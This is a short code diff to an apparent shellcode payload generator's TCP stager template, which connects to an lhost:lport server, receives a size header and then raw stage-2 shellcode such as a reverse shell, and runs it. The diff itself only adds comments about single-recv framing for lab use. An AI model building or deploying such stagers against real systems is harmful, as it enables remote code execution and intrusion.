@@ -7,6 +7,10 @@ Protocol (server speaks first):
   [4 bytes LE] stage2_size
   [stage2_size bytes] raw shellcode bytes
 
+Framing mode: minimal. The four-byte size header is requested with one recv()
+call to reduce emitted size. TCP may return a short header, so this template is
+intended only for controlled lab links and is not a reliable transport mode.
+
 Stage 2 is a separate emitter build (e.g. reverse_shell or copy_then_run)
 assembled to .bin and served immediately after the 4-byte length header.
 
@@ -67,6 +71,7 @@ class TcpStagerTemplate(PayloadTemplate):
             "; ── TCP Stager (stage 1) ────────────────────────────────────────────",
             f"; Server: {config.lhost}:{config.lport}",
             "; Protocol: [uint32 LE size][raw stage-2 shellcode]",
+            "; Framing: minimal (single recv for size header; lab use only)",
             "",
             "    ; WSAStartup(0x0202, &WSADATA)",
             f"    lea  esi, {wsadata}",
